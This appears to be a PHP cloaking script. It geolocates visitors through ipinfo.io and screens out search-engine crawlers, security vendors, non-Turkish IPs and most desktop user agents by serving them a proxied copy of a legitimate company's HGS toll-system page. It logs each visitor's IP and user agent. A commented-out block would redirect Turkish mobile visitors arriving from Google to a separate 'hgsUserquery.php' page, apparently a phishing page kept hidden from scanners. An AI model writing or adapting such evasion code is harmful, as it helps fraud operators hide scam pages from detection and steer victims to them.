<?php
include "analiz.html";
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$ziyaretciuseragent = strtolower($userAgent);
$language = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
// CLOUDFLARE CALISACAGI ZAMAN BURAYI AKTIF ET
/*
if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ziyaretciip = isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR'];
} else {
    $ziyaretciip = isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR'];
}
*/

//GITHUB CALISACAGI ZAMAN BURAYI AKTIF ET
if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ziyaretciip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ziyaretciip = $_SERVER['REMOTE_ADDR'];
}

if(isset($_SERVER['HTTP_REFERER'])) {
    $ziyaretcireferer = $_SERVER['HTTP_REFERER'];
} else {
    $ziyaretcireferer = ''; // Referer bilgisi yoksa boş bir değer ata
}

if (filter_var($ziyaretciip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) 
{
    $url = 'https://www.akisguvenlik.com/hgs-hizli-gecis-sistemleri/';
     // cURL ile web sitesini göster
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    if ($response === false) 
	{
        echo 'cURL hatası: ' . curl_error($ch);
    } else {
        echo $response;
    }
    curl_close($ch);
        // Kodu burada sonlandırabilirsiniz
    exit;
}

$api_url = "https://ipinfo.io/{$ziyaretciip}?token=569c751f497e77";
// cURL ile API'ye istek gönder
$ch = curl_init($api_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
if ($response === false) {
    echo 'cURL hatası: ' . curl_error($ch);
    exit;
}
// JSON yanıtını çözümle
$data = json_decode($response, true);
if ($data === null) 
{
    echo 'JSON yanıtını çözümleme hatası';
    exit;
}

// JSON verilerini ilgili değişkenlere aktar
$ziyaretciulke = strtolower($data['country'] ?? '');
$ziyaretciasnname = strtolower($data['asn']['name'] ?? '');
$ziyaretcicompanyname = strtolower($data['company']['name'] ?? '');
$ziyaretciabusemail = strtolower($data['abuse']['email'] ?? '');
curl_close($ch);

// KURALLAR BLOĞU
// KURAL 1
session_start(); // Oturumu başlat
$not_defteri = json_decode(file_get_contents('not_defteri.json'), true);
$ip_key = md5($ziyaretciip);

if (isset($not_defteri[$ip_key])) {
    $kural = $not_defteri[$ip_key]['kural'];
    $url = $not_defteri[$ip_key]['url'];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    if ($response === false) {
        echo 'cURL hatası: ' . curl_error($ch);
    } 
    else 
    {
        
        echo $response;
    }
    curl_close($ch);
    
    exit;
}

if (
    strpos($ziyaretciulke, 'tr') === false ||
    strpos($ziyaretciasnname, 'google, llc') !== false ||
    strpos($ziyaretcicompanyname, 'google') !== false ||
    strpos($ziyaretcicompanyname, 'ireland') !== false ||
    strpos($ziyaretcicompanyname, 'turknet') !== false ||
    strpos($ziyaretcicompanyname, 'bot') !== false ||
    strpos($ziyaretcicompanyname, 'avast') !== false ||
    strpos($ziyaretcicompanyname, 'viettel') !== false ||
    strpos($ziyaretcicompanyname, 'carinet') !== false ||
    strpos($ziyaretcicompanyname, 'vodafone') !== false ||
    strpos($ziyaretcicompanyname, 'ttnet') !== false ||
    strpos($ziyaretciabuseemail, 'google') !== false
) {
    $url = 'https://www.akisguvenlik.com/hgs-hizli-gecis-sistemleri/';
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    if ($response === false) {
        echo 'cURL hatası: ' . curl_error($ch);
    } 
    else 
    {
  
        echo $response;
    }
    curl_close($ch);
    
    $not_defteri[$ip_key] = [
        'kural' => 'Kural 1',
        'url' => $url
    ];
    file_put_contents('not_defteri.json', json_encode($not_defteri));
    date_default_timezone_set("Europe/Istanbul");
    $current_date_time = date("H:i:s");
    $file_contents = file_get_contents("iploglari.txt");
    $line_count = count(explode("\n", $file_contents));
    $line_number = $line_count + 1;
    $data = "$line_number - $ziyaretciip - $ziyaretciuseragent - $ziyaretciulke - $current_date_time - $language - GOOGLE BOT\n";
    $file = 'iploglari.txt';
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
    exit;
}
// KURAL 1 BİTİŞ

// KURAL 2
if (empty($ziyaretcireferer) || preg_match('/(google|googlebot|x11|ucbrowser|python|webtech|compatible|mac|os|15e148|curl|spider|crawler|mediapartners|apac|none|info|yandex|bing|tiktok|twitter|facebook|sql|slurp|duckduckbot|baiduspider|yandexbot|windows|whatsapp|telegram|discord)/i', $ziyaretciuseragent)) {
    
    $url = 'https://www.akisguvenlik.com/hgs-hizli-gecis-sistemleri/';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    if ($response === false) 
	{
        echo 'cURL hatası: ' . curl_error($ch);
    } 
	else 
	{

        echo $response;
    }
    curl_close($ch);
    
    $not_defteri = json_decode(file_get_contents('not_defteri.json'), true);
    $ip_key = md5($ziyaretciip);
    $not_defteri[$ip_key] = [
        'kural' => 'Kural 2',
        'url' => $url
    ];
       
    file_put_contents('not_defteri.json', json_encode($not_defteri));

    date_default_timezone_set("Europe/Istanbul");
    $current_date_time = date("H:i:s");
    $file_contents = file_get_contents("iploglari.txt");
    $line_count = count(explode("\n", $file_contents));
    $line_number = $line_count + 1;
    $data = "$line_number - $ziyaretciip - $ziyaretciuseragent - $ziyaretciulke - $current_date_time - $language - BOT GIRISI\n";
    $file = 'iploglari.txt';
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
    exit;
}
// KURAL 1 BİTİŞ

/*
// YONLENDIRME KISMI BURASI BASLANGIC
if (
    strpos($ziyaretciulke, 'tr') !== false &&
    (strpos($ziyaretciuseragent, 'android') !== false ||
     strpos($ziyaretciuseragent, 'iphone') !== false ||
     strpos($ziyaretciuseragent, 'ios') !== false) &&
    strpos($_SERVER['HTTP_ACCEPT_LANGUAGE'], 'tr') !== false &&
    (strpos($ziyaretcireferer, 'https://www.google.com') === 0 || strpos($ziyaretcireferer, 'https://www.google.com.tr') === 0)
) {
    ob_start();
    // Yönlendirme
    header('Location: yuklemeler/hgsUserquery.php');
    // Çıktı tamponlamayı sonlandır ve herhangi bir çıktıyı sil
    ob_end_clean();
    date_default_timezone_set("Europe/Istanbul");
    $current_date_time = date("H:i:s");
    $file_contents = file_get_contents("iploglari.txt");
    $line_count = count(explode("\n", $file_contents));
    $line_number = $line_count + 1;
    $data = "$line_number - $ziyaretciip - $ziyaretciuseragent - $ziyaretciulke - $current_date_time - $language - NORMAL GIRIS\n";
    $file = 'iploglari.txt';
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
    exit;
}

// YONLENDIRME KISMI BURASI BITIS
*/

// KURAL 2: Diğer durumlar
$url = 'https://www.akisguvenlik.com/hgs-hizli-gecis-sistemleri/';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec($ch);
if ($response === false) {
    echo 'cURL hatası: ' . curl_error($ch);
} 
else 
{
    echo $response;
}
curl_close($ch);

$not_defteri = json_decode(file_get_contents('not_defteri.json'), true);
$ip_key = md5($ziyaretciip);
$not_defteri[$ip_key] = [
    'kural' => 'Kural 2',
    'url' => $url
];
file_put_contents('not_defteri.json', json_encode($not_defteri));
    date_default_timezone_set("Europe/Istanbul");
    $current_date_time = date("H:i:s");
    $file_contents = file_get_contents("iploglari.txt");
    $line_count = count(explode("\n", $file_contents));
    $line_number = $line_count + 1;
    $data = "$line_number - $ziyaretciip - $ziyaretciuseragent - $ziyaretciulke - $current_date_time - $language - DIGER TURLU GIRISI\n";
    $file = 'iploglari.txt';
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
exit;
// KURAL 2 BİTİŞ
?>
